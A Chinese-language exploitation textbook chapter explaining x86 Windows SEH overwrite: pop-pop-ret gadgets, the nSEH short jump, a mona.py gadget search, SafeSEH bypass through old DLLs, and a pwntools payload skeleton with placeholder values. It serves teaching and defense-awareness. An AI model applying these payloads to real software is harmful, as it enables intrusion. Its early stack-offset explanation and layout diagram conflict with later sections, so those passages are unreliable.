# Ch 21 — SEH overwrite：Windows 經典技法

> **目標**：徹底搞懂 SEH overwrite 從頭到尾的利用鏈——為什麼 SEH record 在 stack 上是可蓋的、例外分發時暫存器狀態為什麼讓 pop-pop-ret 成為核心 gadget、nSEH 的 short jmp 如何把執行流橋到 payload、以及 mona.py 找 PP gadget 的完整工作流。學完能從概念上設計一個 x86 SEH overwrite 的完整利用流程，並能說明 SafeSEH 在哪裡擋、怎麼找符合條件的 gadget source。

> **環境**：本章技法核心需 MSVC（`cl.exe`）、WinDbg/Immunity Debugger + mona.py；相關操作步驟標「未實測，理論預期」。基本概念的 stack 佈局可用 Ch 11 和本章的靜態分析理解；動態驗證請讀者裝好工具後照步驟操作。

---

## 為什麼 SEH overwrite 是 Windows 的「招牌技法」

2004 年之後，MSVC 的 `/GS` 讓「直接蓋 saved EIP」這條路需要過 cookie 關卡。但大量的 Windows 程式在那之後仍然被打——靠的就是 SEH overwrite。

這個技法之所以重要：
1. **只在 x86 存在**（x64 改成 table-based SEH，從根本上阻斷）
2. **能繞過 `/GS`**（SEH record 在 cookie 前面）
3. **是 Corelan 系列教程的核心**，影響了後續十年的 Windows 漏洞利用方法論
4. **SEHOP 出現前**（Vista SP1 之前）幾乎無法防

理解它不只是學一個技法，而是理解整個防禦演進的驅動力：SafeSEH → SEHOP → x64 table-based SEH，這條防線每一步都是為了阻止 SEH overwrite 的變體。

> **先決條件**：確認你讀過 Ch 11（x86 SEH chain 機制）和 Ch 20（`/GS` 機制）。SEH overwrite 是在兩個機制的交界處發動的，沒有這兩章的地基，接下來的分析會漂浮在空中。

---

## 先建立直覺：兩個結構住在同一塊記憶體裡

你在 Ch 11 學過，x86 的 `EXCEPTION_REGISTRATION_RECORD` 住在函式的 **執行 stack 上**：

```c
typedef struct _EXCEPTION_REGISTRATION_RECORD {
    struct _EXCEPTION_REGISTRATION_RECORD *Next;    /* 指向上一個 record */
    PEXCEPTION_ROUTINE                     Handler; /* 這個 frame 的 exception handler */
} EXCEPTION_REGISTRATION_RECORD;
```

你在 Ch 19 學過，`char buf[N]` 也住在同一個函式的執行 stack 上，且在比 SEH record **更低的位址**（更靠近 ESP）。

**stack overflow 往高位址寫（因為 stack 往低位址長，overflow 往高位址蓋）**，所以 overflow 的方向正好是從 buf 往 SEH record 覆蓋。

這不是一個特殊的設計漏洞，而是兩個設計決策（「SEH record 在 stack 上」+「buffer 在更低位址」）在攻擊者手上的組合效應。

```
記憶體方向（低位址 → 高位址）：

  [buf][...][SEH.Next][SEH.Handler][...][cookie][saved EBP][saved EIP]
    ↑                                              ↑
  overflow 起點                              /GS cookie 門衛

  overflow 路徑 ─────────────────────►
  先到 SEH.Next（nSEH），再到 SEH.Handler——都在 cookie 之前！
```

蓋掉 `Handler` 之後，攻擊者還需要一件事：**觸發例外**，讓 Windows 的例外分發器去呼叫被蓋掉的 `Handler`。

---

## 例外分發時的暫存器狀態：pop-pop-ret 的由來

這是整章最關鍵的一個機制細節。當例外發生、`KiUserExceptionDispatcher` 走 SEH chain、呼叫每個 `Handler` 時，handler 的**呼叫慣例是 `stdcall`**，stack 上的參數佈局是：

```
handler 被呼叫瞬間，ESP 指向的 stack（由低到高位址）：

esp+0   → ExceptionRecord*    （EXCEPTION_RECORD 的指標）
esp+4   → EstablisherFrame*   （這個 EXCEPTION_REGISTRATION_RECORD 本身的位址）
esp+8   → ContextRecord*      （例外發生時的 CONTEXT 結構指標）
esp+12  → DispatcherContext*  （內部用）
```

**`EstablisherFrame`（`esp+4`）指向的就是被我們蓋過的 `EXCEPTION_REGISTRATION_RECORD` 在 stack 上的位址**。

換句話說：
- `EstablisherFrame` = 被 overflow 蓋過的那個 `EXCEPTION_REGISTRATION_RECORD` 的起始位址
- `*EstablisherFrame` = `EXCEPTION_REGISTRATION_RECORD.Next`（nSEH 欄位，我們放的 short jmp）
- `*(EstablisherFrame+4)` = `EXCEPTION_REGISTRATION_RECORD.Handler`（PP gadget 位址）

如果我們把 `Handler` 蓋成一個 **pop-pop-ret** gadget，handler 被呼叫時會：

```nasm
; pop reg1  : esp += 4, reg1 = ExceptionRecord*   （彈掉 esp+0 的值）
; pop reg2  : esp += 4, reg2 = EstablisherFrame   （彈掉 esp+4 的值）
; ret       : eip  = *(esp+0) = EstablisherFrame  （把 EstablisherFrame 本身當位址跳）
;             => EIP 跳到 EstablisherFrame 指向的位址
;             => EIP 跳到 EXCEPTION_REGISTRATION_RECORD 的起始位址
;             => EIP 跳到我們放在 nSEH（Next 欄位）裡的指令
```

`ret` 之後，EIP 指向 `nSEH`（`EXCEPTION_REGISTRATION_RECORD.Next` 欄位），那裡放的是 **short jmp**，跳過 `Handler` 欄位到我們的 shellcode。

整個執行流：

```
overflow 蓋掉 nSEH 和 Handler
    ↓
觸發例外
    ↓
KiUserExceptionDispatcher → RtlDispatchException → 呼叫被蓋的 Handler（PP gadget）
    ↓
pop reg1 : 彈 ExceptionRecord*
pop reg2 : 彈 EstablisherFrame
ret      : EIP → nSEH 欄位（short jmp EB 06）
    ↓
short jmp 跳過 Handler 欄位 → shellcode / ROP chain 起點
    ↓
控制流完全被劫持
```

---

## 完整 Stack 佈局圖（帶 SEH record 的函式）

以 MSVC 編譯、有 `__try` 的漏洞函式為例：

```
高位址（stack bottom）
┌─────────────────────────────────────────────────────────────┐
│ [ 呼叫者的 stack frame ]                                     │
│   ...                                                       │
│   argument 1               EBP+8                            │
│   saved EIP                EBP+4  ← /GS 擋在前面，不能直接蓋 │
├─────────────────────────────────────────────────────────────┤ ← EBP
│   saved EBP                EBP+0                            │
│   Stack Cookie (/GS)       EBP-4  ← __security_cookie XOR EBP │
│   EH state (TryLevel)      EBP-8  ← MSVC SEH frame 狀態    │
│   ScopeTable 指標           EBP-C                           │
├─────────────────────────────────────────────────────────────┤
│   SEH Record:                                               │
│     Next (nSEH)            EBP-10 ← 攻擊者放 short jmp     │
│     Handler                EBP-14 ← 攻擊者放 PP gadget 位址 │
├─────────────────────────────────────────────────────────────┤
│   [ local vars, padding ]                                   │
│                                                             │
│   char buf[N]              EBP-X  ← overflow 起點          │
└─────────────────────────────────────────────────────────────┘
低位址（ESP）

overflow 方向（從低位址往高位址）：
buf ──────────────────────────────────────────────────►
     先碰到 nSEH（Handler.Next），再碰到 Handler
     Cookie 在更高位址，overflow 此時還沒有碰到它！
```

**從 buf 到 nSEH 的 offset** 需要用 cyclic pattern 或反組譯算出（每個 binary 不同）。從 nSEH 到 Handler 固定是 4 bytes（`EXCEPTION_REGISTRATION_RECORD.Next` 的大小）。

---

## Payload 佈局與 nSEH Short Jmp 的計算

完整 payload 結構：

```
[ padding：填到 nSEH 的位置 ]    ← offset 個 'A'（用 cyclic pattern 量）
[ nSEH：EB 06 90 90 ]            ← short jmp +6，再加 2 個 NOP padding
[ Handler：PP gadget 位址 ]      ← 4 bytes，little-endian
[ shellcode / ROP chain ]        ← 實際的 payload 起點
```

**`EB 06` 的計算**：

```
nSEH 欄位佔 4 bytes（positions 0-3）：EB 06 90 90
Handler 欄位佔 4 bytes（positions 4-7）

short jmp 語義：JMP rel8
  JMP 0x06 → 跳到當前 EIP（緊接在 EB 06 後面的位址）+ 6
  = nSEH 起始 + 2（指令本身）+ 6 = nSEH + 8

nSEH + 8 正好是 shellcode 的起始位址（nSEH 4 bytes + Handler 4 bytes = 8 bytes）
```

ASCII 圖：

```
位址偏移（從 nSEH 起點算）：
+0   EB    ← JMP opcode
+1   06    ← rel8 = +6
+2   90    ← NOP（padding）
+3   90    ← NOP（padding）
+4   [PP gadget 低 byte]  ← Handler 欄位開始
+5   [PP gadget 次低 byte]
+6   [PP gadget 次高 byte]
+7   [PP gadget 高 byte]
+8   ← jmp 目標：shellcode 在這裡開始

JMP 目標 = EIP_after_EB06 + 6 = (+2) + 6 = +8 ✓
```

如果 shellcode 之前需要更多 padding（例如前面有 30 bytes 的 ASLR slide/NOP sled），`EB 06` 改成 `EB NN`，`NN` 計算方式相同。

---

## 觸發例外的方式

SEH overwrite 需要 overflow 蓋掉 nSEH/Handler 之後，還要觸發一個例外讓 SEH chain 走動。常見方式：

| 方式 | 機制 |
|---|---|
| 蓋掉局部指標後程式解引用它 | `strcpy(buf, input); *ptr = 0;`（ptr 被蓋成任意值 → AV） |
| Overflow 超過 committed stack 邊界 | guard page AV 也走 SEH |
| 程式邏輯後繼崩潰 | 格式字串解析、loop 結束、資源釋放途中觸發 |
| 靶程式內顯式 `__try { *(int*)0=0; }` | 直接在靶程式碼裡製造例外（實驗場景） |

最常見的是第一種：攻擊者讓 overflow 同時蓋 SEH record 和局部指標，函式繼續執行並接觸被蓋的指標，AV 觸發，SEH chain 啟動。

---

## pop-pop-ret Gadget：為什麼要兩個 pop？

`call handler` 本身會 push 一個返回位址。所以 handler 函式入口時的 stack 是：

```
handler 入口（call 已壓入 ret_addr）：
  esp+0:  ret_addr（dispatcher 的返回位址）
  esp+4:  ExceptionRecord*
  esp+8:  EstablisherFrame = &EXCEPTION_REGISTRATION_RECORD  ← 目標
  esp+12: ContextRecord*
  esp+16: DispatcherContext*
```

`EstablisherFrame` 在 `esp+8`，所以需要兩個 pop 才能讓 ESP 走到那格：

```nasm
pop reg1   ; esp → esp+4（彈掉 ret_addr）
pop reg2   ; esp → esp+8（彈掉 ExceptionRecord*）
ret        ; eip = *(esp) = EstablisherFrame = &nSEH（stack 位址）
```

`ret` 後 EIP 指向 nSEH 所在的 stack 位址，執行 `EB 06 90 90`（short jmp），跳到 shellcode。

**如果只用一個 pop**：`ret` 取到 `ExceptionRecord*`（例外記錄結構的指標），跳到那個資料結構——不是我們的控制範圍。**如果直接 ret**：取到 `ret_addr`（dispatcher 的返回位址）——同樣跳不到 nSEH。只有兩個 pop 後的 ret 正好落在 `EstablisherFrame`。

---

## pop-pop-ret gadget 選擇規則

### 不受限制的 pop（只要不改 ESP 上面的資料）

任何暫存器的 `pop` 都可以（EAX、EBX、ECX、EDX、ESI、EDI、EBP 都行），只要：

```nasm
; 都是合法的 pop-pop-ret gadget：
pop eax ; pop ebx ; ret
pop ecx ; pop edx ; ret
pop esi ; pop edi ; ret
pop ebp ; pop eax ; ret    ← EBP 也可以，雖然改了 EBP
```

**不能用 `pop esp`**：那會改變 ESP 本身的值，讓 `ret` 跳到錯誤位址。

### 其他等效結構

```nasm
; 只要最後 ret 之前 esp 指向 EstablisherFrame 就行：
pop eax ; pop eax ; ret           ← 兩次 pop eax 也可以
add esp, 4 ; pop eax ; ret        ← 等效（先移動 4，再 pop 4）
add esp, 8 ; ret                  ← 直接加 8 讓 esp 到 EstablisherFrame，再 ret
```

### Gadget 必須在哪裡

關鍵：gadget **必須在一個不受 SafeSEH 保護的模組裡**（否則 `RtlIsValidHandler` 驗不過，handler 呼叫會被阻斷）。

SafeSEH 的判斷邏輯：
- 如果 handler 位址屬於一個在 Load Config 的 `SE Handler Table` 裡的模組——必須在那個 module 的白名單裡
- 如果 handler 位址屬於一個**完全沒有 SafeSEH 資訊**的模組（老 DLL、沒用 `/SAFESEH` 編的 DLL）——允許，視為不受 SafeSEH 約束

所以搜尋 PP gadget 的目標是：**沒有 SafeSEH 的舊 DLL**（常見的如某些遊戲 DLL、舊版 3rd party 元件、未更新的 system DLL）。

---

## mona.py 工作流：找 pop-pop-ret

mona.py 是 Corelan 出的 Immunity Debugger / WinDbg 外掛，Windows exploit 開發的瑞士刀。

> **未實測，理論預期**：以下操作需要 Immunity Debugger（或 WinDbg + mona.py 相容版本）和 mona.py。

### 步驟 1：確認例外後的 SEH chain

```
! 在 Immunity Debugger 裡，讓程式崩潰後：

!mona exchain
```

預期輸出類似：
```
SEH record found at 0x0012FFB0
 nSEH: 0x41414141  (Couldn't disassemble nSEH)
 SEH:  0x42424242  (not a valid SE handler)
```

`nSEH = 0x41414141`（'AAAA'）說明 nSEH 被蓋了；`SEH = 0x42424242` 說明 handler 也被蓋了（'BBBB'）。這確認 overflow 正確蓋到了兩個欄位。

### 步驟 2：找 cyclic pattern 確認 offset

```python
# 用 pwntools 或 mona 的 pattern 找 offset
from pwn import *

# 生成 1000 bytes 的 cyclic pattern
pattern = cyclic(1000)
# 送給目標，看崩潰時 nSEH 是什麼值
# 在除錯器裡讀 nSEH 值：假設是 0x61616c61 ('aala')
offset = cyclic_find(0x61616c61)
print(f"offset to nSEH = {offset}")
```

或用 mona：
```
!mona pattern_create 1000     # 生成 pattern 並存 msf-pattern.txt
!mona pattern_offset 0x61616c61   # 找 offset
```

### 步驟 3：找 pop-pop-ret gadget

```
!mona seh
```

mona 會搜尋所有載入模組，找出：
1. 包含 `pop reg; pop reg; ret` 序列的位址
2. 過濾掉受 SafeSEH 保護的模組
3. 過濾掉含 `00`（null byte）的位址（因為 `strcpy` 遇到 null 就停）

輸出類似：
```
Address     Module         SafeSEH  ASLR   Rebase  OldSEH  Size
---------   ----------     -------  -----  ------  ------  ----
0x100432AB  3rdparty.dll   False    False  False   False   0x42000
  Found POP POP RETN at 0x100432AB
  Instructions: POP EBX; POP EBP; RETN
  No bad chars found (with -b "\x00")

0x7C8B172F  kernel32.dll   True     False  ...
  (Skipped - SafeSEH enabled for this module)
```

選一個沒有 SafeSEH、沒有 ASLR 的模組裡的 gadget。

### 步驟 4：組裝 payload

```python
from pwn import *

# 假設已知參數：
offset_to_nseh = 100         # cyclic_find 找到的 offset
pp_gadget      = 0x100432AB  # mona seh 找到的 PP gadget
win_function   = 0x004014D0  # 目標函式（或 shellcode 起點）

# payload 組裝
payload = b"A" * offset_to_nseh      # 填到 nSEH
payload += b"\xeb\x06\x90\x90"       # nSEH：short jmp +6，後跟 2 個 NOP
payload += p32(pp_gadget)             # Handler：pop-pop-ret 位址
# shellcode 在這裡（nSEH + 8 開始）
payload += b"\x90" * 16              # NOP sled
payload += shellcode                  # 實際 shellcode / call 目標

print(f"payload length: {len(payload)}")
print(f"nSEH at offset {offset_to_nseh}: {payload[offset_to_nseh:offset_to_nseh+4].hex()}")
print(f"Handler at offset {offset_to_nseh+4}: {payload[offset_to_nseh+4:offset_to_nseh+8].hex()}")
```

### 步驟 5：在除錯器裡驗證（cdb 流程，未實測）

```bat
REM 未實測（需 cdb/WinDbg + mona）
REM 步驟：
REM 1. 在 PP gadget 下 bp：bp 0x100432AB
REM 2. 送 payload，讓程式崩潰，讓 SEH 分發
REM 3. breakpoint 在 PP gadget 被呼叫時命中
REM 4. 確認 esp+8 指向 nSEH 的位址
REM 5. 執行 pop pop ret，確認 eip 跳到 nSEH
REM 6. 執行 short jmp，確認 eip 跳到 shellcode

cdb -c "bp 0x100432AB; g; p; p; p; r; q" target.exe
REM 預期：第三個 p（執行 ret 後），r 顯示 eip = nSEH 的 stack 位址
```

---

## SafeSEH：這個技法的主要限制

`/SAFESEH`（MSVC 連結器旗標）在 PE 的 Load Config 目錄裡建立一個 handler 白名單：

```
IMAGE_LOAD_CONFIG_DIRECTORY.SEHandlerTable → [handler_1_RVA, handler_2_RVA, ...]
IMAGE_LOAD_CONFIG_DIRECTORY.SEHandlerCount → N
```

`RtlIsValidHandler`（`ntdll` 裡的函式）在呼叫任何 handler 之前驗證：

```c
/* 簡化邏輯 */
BOOL RtlIsValidHandler(PVOID handler) {
    /* 找到 handler 所在的模組 */
    PLDR_DATA_TABLE_ENTRY module = find_module(handler);
    
    if (module == NULL) return FALSE;  /* 不在任何模組裡（stack/heap 上的 shellcode）*/
    
    if (module->SafeSEH == TRUE) {
        /* 模組有 SafeSEH：handler 必須在白名單裡 */
        return is_in_safeseh_table(module, handler);
    } else {
        /* 模組沒有 SafeSEH 資訊：視為「不受 SafeSEH 保護的老模組」，直接允許 */
        return TRUE;
    }
}
```

**關鍵**：沒有 SafeSEH 資訊的模組（老 DLL）被允許；有 SafeSEH 但 handler 不在白名單裡的模組被拒絕。

繞過 SafeSEH 的標準手法：
1. 找一個沒有 `/SAFESEH` 的老 DLL（`!mona seh` 的 SafeSEH 欄位為 False）
2. 在那個 DLL 裡找 PP gadget
3. 把 handler 指向那個 DLL 裡的 gadget → `RtlIsValidHandler` 允許

常見的「沒有 SafeSEH」模組來源：
- 舊版 3rd-party DLL（沒用新 MSVC 重編過的）
- 舊系統 DLL（某些 WinXP/Vista 時代的 DLL 沒有 SafeSEH）
- 應用程式本身如果用舊工具鏈編（但現代應用大多有）

---

## 為什麼 x64 不能用這個技法

Ch 12 講過，x64 Windows 把 exception handler 的資訊移到了 PE 的 `.xdata` 節裡（`UNWIND_INFO` 結構），不在 stack 上。stack overflow 蓋不到 `.xdata`（在 image 的唯讀 section），所以根本沒有「蓋掉 handler」的機會。

x64 的例外分發是 table-lookup：給定觸發例外的 RIP，在 `.pdata` 裡找對應的 `RUNTIME_FUNCTION`，再找 `UNWIND_INFO` 裡的 handler RVA——一切都是 image 內的靜態資料，不是 stack 上的可寫指標。

所以：
- **SEH overwrite 是純 x86 技法**
- x64 的「stack overflow 攻擊面」退化回「蓋 saved RIP + ROP」，或者「攻擊 VEH/UEF」（那是 heap 上的資料結構，難度不同）

在現實的滲透/CTF 中，如果目標是 x86 binary（32 位元進程），SEH overwrite + PP gadget 仍然是第一個要試的工具。如果是 x64，直接進 ROP。

---

## 利用骨架（教育性，標未實測）

> **未實測，理論預期**：以下骨架需 MSVC 帶 `__try` 的靶 + Immunity Debugger + mona.py。替換 `OFFSET_TO_NSEH`、`PP_GADGET`、`WIN_FUNCTION` 為真實值再跑。

```python
# seh_exploit.py — 教育性骨架
from pwn import *

OFFSET_TO_NSEH = 100         # cyclic_find 量到的 offset
PP_GADGET      = 0x100432AB  # mona seh 找到，SafeSEH=False 的 DLL 裡
WIN_FUNCTION   = 0x004014D0  # 目標函式

nseh    = b"\xeb\x06\x90\x90"  # short jmp +6：跳到 nSEH+8（Handler 後面）
handler = p32(PP_GADGET)

payload  = b"A" * OFFSET_TO_NSEH
payload += nseh
payload += handler
payload += b"\x90" * 16        # NOP sled
# 後接 shellcode / CALL win_function

print(f"[*] len={len(payload)}, nSEH={nseh.hex()}, handler={hex(PP_GADGET)}")
```

---

## 對比與取捨

| 方面 | SEH overwrite | 直接蓋 saved EIP（Ch 19） |
|---|---|---|
| 繞過 `/GS` | 是（SEH record 在 cookie 前） | 否（cookie 擋在前面） |
| 需要 `__try` | 是（或至少上層函式有 SEH） | 否 |
| 需要 PP gadget | 是 | 否（直接填目標位址） |
| 受 SafeSEH 限制 | 是 | 否 |
| 受 SEHOP 限制 | 是（Ch 22 細講） | 否（SEHOP 只驗 SEH chain） |
| 在 x64 有效 | 否（table-based SEH） | 否（RIP 上方有 canary，且 DEP 在） |
| 難度 | 中（需要找 PP gadget，過 SafeSEH） | 低（如果沒有 cookie 和 ASLR） |

---

## 踩雷集錦

1. **「pop pop ret 就是 pop pop call ret」**：不要多想。標準 PP gadget 就是字面意思：`pop reg; pop reg; ret`，三條指令，不帶任何 call。`call` 會再 push 一個返回位址，破壞 stack 平衡。

2. **「nSEH 的 short jmp 可以用任何值」**：不行。`EB XX` 的 XX = nSEH 起點到 shellcode 起點的距離 - 2（JMP 指令本身 2 bytes）。nSEH 欄位 4 bytes + Handler 欄位 4 bytes = 8 bytes，所以 XX = 8 - 2 = 6，寫 `EB 06`。如果 shellcode 前面還有 NOP sled，對應加大 XX。

3. **「只要找到任何一個 pop pop ret 就能用」**：必須是**沒有 SafeSEH** 的模組裡的 gadget。如果 gadget 在 kernel32.dll（有 SafeSEH），`RtlIsValidHandler` 會拒絕，handler 不會被呼叫。`!mona seh` 的輸出裡 `SafeSEH` 欄位必須是 `False`。

4. **「SEH overwrite 在 x64 也能用」**：x64 的 SEH 是 table-based，handler 在 `.xdata` 唯讀節裡，stack overflow 蓋不到。x64 上沒有「SEH record on stack」這回事。這個技法是純 x86 的。

5. **「觸發例外後直接走 shellcode，不需要 short jmp 橋接」**：不對。pop-pop-ret 讓 EIP 跳到 nSEH 的 **stack 位址**（不是 nSEH 的值），你要在那個位址放一個合法的指令，橋接到 shellcode。如果 nSEH 欄位（4 bytes）直接放 shellcode 的前 4 bytes，位元組空間不夠且位址不對。short jmp 是解決這個「跳轉位置不直接到 shellcode」問題的標準方法。

---

## 進階：再往深一層

### SEHOP 的封堵

SEHOP（Structured Exception Handler Overwrite Protection，Vista SP1 起的 server edition 預設開啟）在 `RtlDispatchException` 走 chain 之前，先驗整條鏈的完整性：

1. 每個 record 的 `Next` 必須指向比目前 record 更高的 stack 位址
2. 鏈必須以 `ntdll!FinalExceptionHandlerPad`（OS 注入到 TEB 的 sentinel）結尾

如果 overflow 蓋了 nSEH，鏈的完整性被破壞——SEHOP 偵測到，直接終止進程，不呼叫任何 handler。Ch 22 詳講 SEHOP 的設計和它的繞過思路。

### VEH 路線：繞開 SEH chain

Vectored Exception Handler（VEH）在 SEH chain 之前被呼叫。VEH handler 的資訊存在 heap 上（`ntdll` 的一個鏈結串列），不在 stack 上。如果攻擊者能攻擊 VEH 鏈結串列（需要 heap 寫入原語），可以在 SEHOP 之前就劫持控制流。這是更高難度的路線，Ch 12 有基礎介紹，Part 4 的 heap exploitation 是前置。

### 面試題：SafeSEH 和 SEHOP 的防禦覆蓋面

問：SafeSEH 和 SEHOP 都開了，SEH overwrite 還有可能嗎？

答：理論上很難，但有幾個殘留攻擊面：
1. 沒有 SafeSEH 的老 DLL 仍然載入的話，PP gadget 還是能從那裡找
2. SEHOP 在 Vista SP1 起只在 server edition 預設開（client edition 要手動開）
3. x64 用 table-based SEH，兩個機制根本用不到——但 x64 有其他攻擊面（VEH、ROP）

### 現代 CTF 場景

現代 Windows pwn CTF 裡，x86 SEH overwrite 如果出現，通常是「老系統、老 binary、刻意關掉 SEHOP」的設定，或者拿來考「你知道這個技法的基本原理嗎」。現代靶機（Win10/11 x64）幾乎全是 DEP + ASLR + CFG，打法是 Part 5 的主題。SEH overwrite 在 CTF 裡的實用性逐年下降，但對理解 Windows 例外處理的底層設計仍然不可或缺。

---

## 動手練習

> **環境**：需要 MSVC（cl.exe x86 模式）+ Immunity Debugger + mona.py。

1. 用 MSVC 編一個含 `__try` 的漏洞靶（`strcpy` + `*(int*)0 = 0` 在 `__try` 裡）：`cl /GS /Od target_seh.c`。
2. 用 Immunity Debugger 掛上，送 cyclic pattern，`!mona exchain` 確認 nSEH 和 Handler 被蓋（輸出顯示 `0x41414141`）。
3. `!mona pattern_offset <nSEH 值>` 算出 offset to nSEH。
4. `!mona seh` 找到一個 `SafeSEH=False` 且無 ASLR 的模組裡的 PP gadget。
5. 用本章的 Python 骨架組裝 payload，確認執行流走完「PP gadget → short jmp → shellcode 起點」整條路。

---

## 本章重點整理

- SEH overwrite 利用 `EXCEPTION_REGISTRATION_RECORD` 住在 stack 上（比 `/GS` cookie 更靠近 buf），overflow 先蓋 nSEH 和 Handler，再觸發例外讓 OS 呼叫被蓋的 handler。
- pop-pop-ret 是核心 gadget：handler 被呼叫時 `esp+8` 是 `EstablisherFrame`（= &nSEH），兩個 pop 彈掉前兩個參數後 `ret` 取到 EstablisherFrame，跳到 nSEH 位置。
- nSEH 放 short jmp（`EB 06`）跳過 Handler 欄位到 shellcode；Handler 放 PP gadget 位址。
- SafeSEH 要求 handler 在模組的白名單裡；繞過手法是找沒有 SafeSEH 的老 DLL 作為 gadget 來源。
- 此技法是純 x86 的：x64 用 table-based SEH，handler 在 `.xdata` 唯讀節，overflow 蓋不到。

---

## 自我檢核

- [ ] 不看筆記，能畫出 SEH overwrite 的 payload 佈局（padding / nSEH / Handler / shellcode），並說明每個欄位的作用
- [ ] 能解釋「為什麼要兩個 pop 而不是一個」——從 handler 呼叫時 stack 上的參數排列（包含 call 壓的返回位址）推導
- [ ] 能計算 `EB XX` 的 XX：nSEH 到 shellcode 之間有 nSEH 後 2 bytes + Handler 4 bytes = 6 bytes，所以 XX=6，寫 `EB 06`。能說清楚「從 JMP 指令結束位置算起跳多少 bytes」的算法
- [ ] 能說出 SafeSEH 擋在哪裡（哪個函式驗證、驗的是什麼）以及繞過的條件
- [ ] 面試被問「為什麼 SEH overwrite 不能在 x64 上用」：能從「x64 用 table-based SEH」回答，並說明 table 在哪（`.xdata`）、為什麼 stack overflow 蓋不到

---

## 延伸閱讀

### 部落格 / 教學

- **Corelan Team — "Exploit writing tutorial part 3: SEH Based Exploits"** — Peter Van Eeckhoutte（[corelan.be](https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/)）
  - **讀哪裡**：全文；特別是「The exploit」一節的逐步流程和 mona.py 工作流
  - **學什麼**：SEH overwrite 的原始黃金教程，現在仍是業界標準參照；本章的架構和術語直接來自這篇
  - **和本章關聯**：本章是概念深挖，這篇是動手實踐的腳本；兩者結合才完整
  - **前提**：Ch 11（SEH 機制）+ Ch 20（/GS）+ 本章

- **Corelan Team — "Exploit writing tutorial part 3b: SEH based exploits – the sequel"**（[corelan.be](https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example/)）
  - **讀哪裡**：「/GS vs SEH overwrite」和 SafeSEH bypass 兩節
  - **學什麼**：用真實靶（Vulnserver）示範有 /GS 的靶怎麼找 SafeSEH=False 的 DLL 做 PP gadget
  - **和本章關聯**：本章是理論和骨架，這篇是活生生的靶機 demo；讀完本章再看這篇才能懂每個步驟的「為什麼」

### 論文 / 研究

- **"Bypassing Browser Memory Protections"** — Alexander Sotirov & Mark Dowd（Black Hat US 2008）([bhusa08-sotirov-dowd-wp.pdf](https://www.blackhat.com/presentations/bh-usa-08/Sotirov_Dowd/bh08-sotirov-dowd-wp.pdf))
  - **讀哪裡**：第 4 節「SafeSEH」
  - **學什麼**：從攻擊者視角形式化分析 SafeSEH 的覆蓋面和盲點；比 Corelan 更系統性
  - **和本章關聯**：本章的 SafeSEH 繞過條件分析來自這篇的框架
  - **前提**：本章讀完

- **Matt Miller (skape) — "Safely Searching Process Virtual Address Space"** — 2004（[phrack.org/issues/63/14.html](http://www.phrack.org/issues/63/14.html)）
  - **讀哪裡**：全文（較短）
  - **學什麼**：在 exploit 中「安全搜尋」進程 VA space 以找 gadget 的技法，和 mona.py 的搜尋邏輯的前身
  - **和本章關聯**：mona.py `!mona seh` 的底層思路，理解工具做了什麼才能在它不夠用時手動做
  - **前提**：x86 assembly 和 Win32 進程記憶體模型

### 工具

- **[mona.py — Corelan Team（GitHub）](https://github.com/corelan/mona)**
  - **讀哪裡**：README 裡的 `!mona seh`、`!mona pattern_create/offset`、`!mona modules` 三個命令
  - **學什麼**：`!mona seh` 的輸出欄位意義（SafeSEH / ASLR / Rebase / NX / OldSEH）；如何解讀每個模組的防護狀態來選 gadget 來源
  - **和本章關聯**：本章用到 mona 的地方都是「未實測，理論預期」；裝好後拿這份文件對照實際輸出

SEH overwrite 把 Windows 的例外處理設計暴露在 exploitation 的聚光燈下。SEHOP 是 Microsoft 的直接回應——下一章看 SEHOP 怎麼從根本上封堵這條路，以及它的盲點在哪裡。

→ [Ch 22 — SEHOP：機制與繞過](./22-sehop.md)
